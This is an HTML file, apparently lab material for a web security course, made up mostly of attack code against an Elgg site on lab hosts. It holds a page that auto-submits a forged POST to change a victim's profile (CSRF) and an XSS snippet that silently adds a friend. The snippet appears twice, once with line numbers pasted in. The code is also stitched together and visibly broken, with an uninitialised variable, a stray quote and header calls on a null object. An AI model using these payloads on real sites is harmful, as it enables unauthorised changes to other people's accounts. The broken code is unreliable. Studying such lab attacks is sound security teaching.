test
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack using POST Request</title>
</head>
<body>
    <h1>CSRF Attack using POST Request</h1>

    <p>This page will automatically send a forged POST request to the target URL.</p>

    <script type="text/javascript">
        function forge_post() {
            var fields;
            // The following are form entries made by attackers.
            // The entries are made hidden, so the victim won't be able to see them.
            fields += "<input type='hidden' name='name' value='Alice''>";
            fields += "<input type='hidden' name='briefdescription' value='Boby is my Hero'>";
            fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'> ";
            fields += "<input type='hidden' name='guid' value='42'>";

            // Create a <form> element.
            var p = document.createElement("form"); 

            // Construct the form
            p.action = "http://www.csrflabelgg.com/action/profile/edit";
            p.innerHTML = fields;
            p.method = "post";

            // Append the form to the current page.
            document.body.appendChild(p);

            // Submit the form
            p.submit();
        }

        // Invoke forge_post() after the page is loaded.
        window.onload = function () { forge_post(); }
    </script>
</body>

1  <script type="text/javascript">
2      window.onload = function () {
3          var Ajax = null;
4          var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
5          var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
6          //Construct the HTTP request to add Samy as a friend.
7          var sendurl = 'http://www.csrflabelgg.com/action/friends/add?friend=45'; //FILL IN
8          //Create and send Ajax request to add friend
9          Ajax = new XMLHttpRequest();
10         Ajax.open("GET", sendurl, true);
11         Ajax.send();
12     }
13     Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
14     Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
15 </script>

<script type="text/javascript">
    window.onload = function () {
        var Ajax = null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
        //Construct the HTTP request to add Samy as a friend.
        var sendurl = 'http://www.xsslabelgg.com/action/friends/add?friend=45'; //FILL IN
        //Create and send Ajax request to add friend
        Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
    Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
</script>

</html>
